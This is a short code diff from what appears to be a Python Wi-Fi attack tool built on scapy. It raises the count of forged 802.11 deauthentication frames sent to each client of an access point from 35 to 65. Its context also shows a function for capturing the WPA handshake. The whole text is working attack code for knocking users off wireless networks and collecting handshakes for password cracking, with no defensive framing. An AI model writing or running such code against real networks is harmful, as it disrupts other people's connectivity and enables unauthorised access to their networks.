@@ -67,10 +67,10 @@ def send_deauth(bssid: str, client_list:list, channel: int)-> None:
     subprocess.run(['iwconfig', i_face, 'channel', str(channel)])
 
     for client in client_list:
-        print(f"Sending 35 deauth requests to {client} with bssid: {bssid}")
+        print(f"Sending 65 deauth requests to {client} with bssid: {bssid}")
         dot11 = Dot11(addr1=client, addr2=bssid,addr3=bssid)
         packet = RadioTap()/dot11/Dot11Deauth(reason=7)
-        sendp(packet, inter=0.1, count=35, iface=i_face, verbose=1)
+        sendp(packet, inter=0.1, count=65, iface=i_face, verbose=1)
 
 def capture_handshake(bssid: str, channel: int, ssid: str, client_list: list)-> str:
 
